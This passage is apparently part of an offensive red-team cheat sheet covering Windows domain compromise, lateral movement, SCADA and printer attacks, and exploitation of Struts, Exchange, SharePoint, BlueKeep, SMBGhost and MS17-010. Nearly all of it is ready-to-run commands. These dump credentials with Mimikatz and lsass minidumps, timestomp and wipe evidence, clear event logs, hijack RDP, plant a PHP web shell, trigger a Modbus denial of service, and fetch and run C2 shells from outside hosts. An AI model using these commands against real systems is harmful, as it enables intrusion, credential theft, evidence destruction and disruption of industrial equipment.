	# token theft via icmp (example, see oneliners for other options). for domain escalation or evasion.
	invoke_file /tmp/Invoke-TokenManipulation.ps1
	invoke-tokenmanipulation -createprocess "cmd.exe" -username "<DOMAIN>/<USER>" processargs "/c powershell -exec bypass -noninteractive -e <BASE64>"";

	# downgrade for DES hash, crack DES for NTLM using internal monologue. see https://crack.sh/get-cracking/ for free cracking.
	invoke_file /tmp/Get-Hash.ps1
	Get-Hash
	invoke-binary /tmp/InternalMonologue.exe

	# kerberoast, crack spns offline
	invoke_file /tmp/Invoke-Kerberoast.ps1
	invoke-kerberoast -domain target.local -outputformat hashcat|select hash
	
	# loot TGT/TGS via evil-winrm
	invoke-binary rubeus.exe triage
	invoke-binary rubeus.exe dump
	
	# loot credentials lsass, lsa secrets
	dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
	invoke_file /tmp/Invoke-Mimikatz.ps1
	Invoke-Mimikatz
	
	# loot credentials without being admin
	invoke_binary Invoke-Mimikittenz.exe
	
	# minidump and lsa dump via icmp c2 
	invoke_file /tmp/Invoke-PowerDump.ps1
	Invoke-PowerDump
	
	# lsa secrets via hives, dump lsa and sam hashes offline
	C:\> reg.exe save hklm\sam c:\temp\sam.save
	C:\> reg.exe save hklm\security c:\temp\security.save
	C:\> reg.exe save hklm\system c:\temp\system.save
	python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
	
	# looting lsass via minidumps, cover tracks (timestomp and secure delete).
	invoke_file /tmp/Out-Minidump.ps1
	Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
	TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
	download c:\temp\lsass_<PID>.dmp 
	SecureDelete c:\temp\lsass_<PID>.dmp 
	
	# parse dumps offline using mimikatz
	mimikatz # sekurlsa::minidump lsass.dmp
	mimikatz # sekurlsa::logonPasswords full

	# clear logs, disable and redirect rdp to box of choice. 
	foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}
	DisableRDP
	
	# port forward rdp traffic to box.
	netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>

	# on box of choice, hijack rdp, query tscon ID, create service (for sassy blueteams, especially useful on gui dc).
	query user # find tscon ID, e.g. 1
	sc create rdphijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
	net start rdphijack
	
```	
###### 8.) Lateral movement via Windows and Linux.
```txt
	# ongoing access, order of presedence (note patch amsi on all powershell)
	proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
	proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
	proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
	proxychains mssqlclient.py -windows-auth -port <PORT> -db <DB> -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<DBIP>;
	proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
	proxychains ssh <USER>@<TARGET>
	proxychains mysql -u <USER> -p <PORT> -h <TARGETIP> -e "select \"<?php echo shell_exec($_GET['cmd']); ?> \" into outfile \"/var/www/html/shell.php\";"

	# windows traffic redirection
	netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
	netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<IP>
	netsh interface portproxy add v6tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
	netsh interface portproxy delete v6tov4 listenport=<PORT> listenaddress=<IP>
	netsh interface portproxy show all

	# linux traffic redirection
	ssh -f -N -L <IP>:<PORT>:<TARGETIP>:<TARGETPORT> <GATEWAYIP>
	socat TCP-LISTEN:<PORT>,bind=<IP>,fork,reuseaddr TCP:<TARGETIP>:<TARGETPORT>
	ssh -f -N -D <IP>:<PORT> root@<GATEWAYIP>
	socat TCP4-LISTEN:445,fork,bind=<IP> SOCKS4:<PROXYIP>:<TARGETIP>:<TARGETPORT>,socksport=<PORT>

	# host discovery andfingerprinting services (icmp proxy?)
	proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
	proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA NETWORK_service_fiingerprint_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
	proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_header_scan -iL <IPLIST>
	proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>

	# domain enumeration via host, using bloodhound
	invoke_file /tmp/Sharphound.ps1
	Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
	TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
	download c:\temp\<BLOODHOUND>.zip
	SecureDelete c:\temp\<BLOODHOUND>.zip

	# domain enumeration domain via host, using powershell
	invoke_file /tmp/PowerView.ps1
	$boxes=get-netcomputer -domain <DOMAIN> -fulldata
	$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};

	# enumeration domain via proxy
	proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
	proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
	proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
	proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
	proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";

	# file share access
	mount -t cifs //<PROXYIP>/<SHARE> /mnt/share -o username=<USER>,password=<PASSWORD>,domain=<DOMAIN>,iocharset=utf8,file_mode=0777,dir_mode=0777
	net share Desktop=c:\users\administrator\desktop /grant:everyone,FULL
	net share Desktop /delete
	net use p: \\<IP>\<SHARE>
	net use p: http:\\<WEBDAVURL>
	net use p: /delete

	# enumerating shares via host for creds and machineKey, powershell
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/appSettings/add")}
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
	gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
	$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
	foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.config -path "$share"|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")|where key -match pass}}

	# database access
	proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
	proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>

	# kerberoasting, crack spns
	proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
	proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
	hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
	
	# llmnr, nbns, wpad poisoning, ntlm relay
	Invoke-Inveigh -HTTP N -NBNS -Y
	Invoke-InveighRelay -ConsoleOutput Y -Target <IP> -Command  "<COMMAND>"
```
###### 9.) Windows domain based privesc, unconstrained.
```txt	
	# find unconstrained delegation objects (computer scenario, sql)
	proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USERNAME>;

	# dump machine NTLM hashes and aes256 key
	proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;

	# add spn via dns (SPN = HOST/PWN-<FQDNOFMACHINE>)
	proxychains addspn.py -u <DOMAIN\\USER> -p <PASSWORDORHASHES> -s <SPN> --additional ldap://<DCFQDN>;

	# add dns via adidns 
	proxychains dnstool.py -u <DOMAIN}\\USER> -p <PASSWORDORHASHES> -r <SPN> -a add -d <ATTACKERIPADDRESS> <DCFQDN>;

	# setup relay to get ticket
	python krbrelayx.py -aesKey <AES256HASH>

	# verify print spool on target dc
	proxychains rpcdump.py -port 135 <TARGETDCFQDN>|grep "MS-RPRN";

	# trigger print spool (SPN you created)
	proxychains printerbug.py -hashes <HASHES> <DOMAIN/USER>@<DCFQDN> <SPN>

	# export ccache to use for ptt
	export KRB5CCNAME=<CACHEOFTGT>

	# dump dc using tgt (use domain admin ntlm hash etc...)
	proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;	
```	
	
###### 10.) Scada exploitation.
```txt
	# discover modbus
	proxychains nmap -v -sT -p502 -sV -oA <NETWORK>_modbusscan --open <NETWORK/CIDR>

	# initial access via brute uid
	proxychains python smod.py 
	> use modbus/scanner/uid
	> set RHOSTS <IP>
	> exploit

	# enumeration, get functions
	> use modbus/scanner/getfunc # or > use modbus/scanner/getfunc
	> set RHOSTS <IP>
	> set RPORT 502
	> set UID <UID>
	> exploit

	# read coils
	> use modbus/function/readCoils
	...
	> exploit

	# write coil (will cause DOS!)
	> use modbus/dos/writeSingleCoils
	> show options
	...
	> exploit	
```	
###### 11.) Printer exploitation.
```txt
	# discover ipprinters
	proxychains pret.py
	proxychains nmap -v -sT -p631 -sV -oA <NETWORK>_ippscan --open <NETWORK/CIDR>

	# initial access to ipprinter, accounting bypass (CUPS CVE?)
	proxychains pret.py <IP> pjl
	proxychains snmpset -v1 -c public <IP> 1.3.6.1.2.1.43.5.1.1.3.1 i 6

	# enumeration, generic commands etc.. 
	> env
	> ls ../../
	> put <LFILE>
	> get <RFILE>
	> info config  
	> info memory

	# troll team display message?
	> display "FUNNY MESSAGE ETC"

	# loot memory, fs (sensitive data, creds, etc..)
	> unlock
	> nvram dump 
	> get /etc/shadow

	# pivot ?
	> open <OTHERIP>		
```	
###### 11.) Lateral movement via exploitation.
```txt
	# struts 2-59 exploit 
	proxychains struts_cve-2019-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'

	# exchange exploit
	proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
	proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"

	# sharepoint, command based payload
	proxychains python sharepoint_cve-2019-0604.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -version 2016 -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

	# sharepoint, requires editing gadget
	ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	proxychains python sharepoint_cve-2020-1147.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD>

	# sharepoint sql report, requires editing gadget (needs testing)
	ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" -o base64 
	proxychains python sqlreport_cve_2020-0618.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -payload shell

	# rdp, requires editing shellcode
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  python
	proxychains python bluekeep_cve-2019-0708.py <IP> 

	# smb3 exploits
	proxychains python3 smbghost_cve-2020-0796.py <TARGETIP> <REVERSEIP> <REVERSEPORT>

	# legacy equation group smb exploits
	proxychains python checker.py <IP>
	proxychains python ms17-010.py -target <IP> -pipe_name samr -command "cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"	
```	
